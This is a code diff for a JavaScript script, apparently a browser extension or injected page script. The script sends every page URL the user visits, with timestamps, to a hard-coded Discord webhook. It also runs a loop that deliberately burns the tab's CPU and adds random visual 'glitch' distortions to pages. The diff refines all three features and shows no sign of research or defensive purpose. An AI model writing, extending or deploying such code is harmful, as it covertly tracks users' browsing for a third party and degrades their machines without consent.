@@ -2,17 +2,24 @@ const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/135193797971895913
 
 function sendVisitToDiscord(url) {
   const now = new Date();
-  const timestamp = now.toLocaleString(); // e.g. "7/6/2025, 8:13:14 PM"
+  const timestampLocal = now.toLocaleString();       // e.g. "7/6/2025, 8:13:14 PM"
+  const timestampISO = now.toISOString();             // for embed.timestamp
 
   const payload = {
-    content: `🌐 Visited: ${url}\n🕒 Time: ${timestamp}`
+    embeds: [
+      {
+        title: "🌐 New Page Visit",
+        url: url,
+        description: `🕒 Visited at ${timestampLocal}`,
+        color: 0x00AE86,       // change to any hex color you like
+        timestamp: timestampISO
+      }
+    ]
   };
 
   fetch(DISCORD_WEBHOOK_URL, {
     method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
+    headers: { "Content-Type": "application/json" },
     body: JSON.stringify(payload)
   }).catch(err => {
     console.error("❌ Failed to send to Discord:", err);
@@ -34,7 +41,6 @@ if (document.readyState === "complete" || document.readyState === "interactive")
 
 // CPU burn function:
 const INTENSITY = 300; // 1–100 ms CPU burn duration
-
 function burnTabCPU() {
   setInterval(() => {
     const end = Date.now() + INTENSITY;
@@ -43,17 +49,14 @@ function burnTabCPU() {
     }
   }, 10);
 }
-
 burnTabCPU();
-
-// Your existing code above here...
 
 // --------- GLITCH EFFECT ---------
 
 function glitchUI() {
   const body = document.body;
 
-  // Create CSS classes for glitch effect dynamically (only once)
+  // Insert style & SVG filter once
   if (!document.getElementById('glitch-style')) {
     const style = document.createElement('style');
     style.id = 'glitch-style';
@@ -66,24 +69,13 @@ function glitchUI() {
         80% { transform: translate(1px, -1px) skew(-0.3deg); filter: drop-shadow(-1px -1px yellow); }
         100% { transform: translate(0); filter: none; }
       }
-
       .glitch-effect {
         animation: glitch-shift 0.3s ease-in-out;
         animation-iteration-count: 3;
         animation-direction: alternate;
       }
-
-      /* Optional: quick RGB split using filter */
       .glitch-rgb {
         filter: url('#rgbShiftFilter');
-      }
-    `;
-
-    // Optional SVG filter for RGB shift (if you want fancier glitch)
-    style.textContent += `
-      svg {
-        position: absolute;
-        width: 0; height: 0;
       }
     `;
     document.head.appendChild(style);
@@ -91,37 +83,34 @@ function glitchUI() {
     const svgFilter = document.createElementNS("http://www.w3.org/2000/svg", "svg");
     svgFilter.innerHTML = `
       <filter id="rgbShiftFilter">
-        <feColorMatrix in="SourceGraphic" type="matrix" values="1 0 0 0 0
-                                                             0 1 0 0 0
-                                                             0 0 1 0 0
-                                                             0 0 0 1 0" result="normal" />
+        <feColorMatrix in="SourceGraphic" type="matrix"
+          values="1 0 0 0 0
+                  0 1 0 0 0
+                  0 0 1 0 0
+                  0 0 0 1 0" result="normal"/>
         <feOffset in="normal" dx="2" dy="0" result="off1"/>
         <feOffset in="normal" dx="-2" dy="0" result="off2"/>
-        <feBlend in="off1" in2="off2" mode="screen" />
+        <feBlend in="off1" in2="off2" mode="screen"/>
       </filter>
     `;
     document.body.appendChild(svgFilter);
   }
 
-  // Add the glitch class
   body.classList.add('glitch-effect');
-
-  // Remove it after animation ends (~0.9s total)
   setTimeout(() => {
     body.classList.remove('glitch-effect');
   }, 500);
 }
 
-// Trigger glitch every 30 to 60 seconds randomly
+// Trigger glitch every 30–60 seconds randomly
 function startRandomGlitch() {
-  function scheduleNext() {
-    const delay = 30000 + Math.random() * 30000; // 30k to 60k ms
+  (function scheduleNext() {
+    const delay = 30000 + Math.random() * 30000;
     setTimeout(() => {
       glitchUI();
       scheduleNext();
     }, delay);
-  }
-  scheduleNext();
+  })();
 }
 
 startRandomGlitch();
